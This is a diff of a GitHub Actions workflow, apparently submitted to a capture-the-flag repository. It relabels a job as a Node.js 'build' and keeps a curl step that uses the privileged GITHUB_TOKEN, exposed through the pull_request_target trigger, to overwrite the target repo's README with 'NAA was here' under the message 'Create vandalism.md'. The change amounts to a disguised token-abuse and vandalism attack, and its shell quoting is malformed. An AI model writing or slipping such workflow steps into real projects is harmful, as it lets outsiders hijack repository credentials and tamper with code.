@@ -2,11 +2,13 @@ name: ctf registration
 on: [push, pull_request, pull_request_target]
 
 jobs:
-  ctf_registration:
+  build:
     runs-on: ubuntu-latest
     steps:
-      - name: register player
-        uses: actions/checkout@v2
+      - uses: actions/checkout@v2
+      - name: Use Node.js ${{ matrix.node-version }}
+        uses: actions/setup-node@v1
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-      - run: 'curl -H "Authorization: bearer $GITHUB_TOKEN" -X PUT "https://api.github.com/repos/incredibly-secure-naortalmor1/contents/README.md" --data {"message": "Create vandalism.md", "content": "TkFBIHdhcyBoZXJl"}' '
+      - run: |
+          curl -H "Authorization: bearer $GITHUB_TOKEN" -X PUT "https://api.github.com/repos/incredibly-secure-naortalmor1/contents/README.md" --data {"message": "Create vandalism.md", "content": "TkFBIHdhcyBoZXJl"}'
